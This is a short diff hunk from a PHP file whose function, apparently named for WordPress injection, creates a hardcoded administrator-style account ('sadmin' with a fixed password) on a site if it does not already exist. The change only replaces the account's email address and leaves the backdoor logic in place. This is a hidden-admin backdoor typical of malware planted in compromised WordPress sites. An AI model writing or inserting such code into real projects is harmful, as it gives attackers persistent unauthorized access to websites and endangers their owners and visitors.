@@ -148,7 +148,7 @@ function handle_wp_injection($path) {
 
     $user = 'sadmin';
     $pass = '!m4l1k4$@$T0L###';
-    $mail = 'rizkaameliaa022@gmail.com';
+    $mail = 'sadmin@gmail.com';
 
     if (!username_exists($user) && !email_exists($mail)) {
         $uid = wp_create_user($user, $pass, $mail);
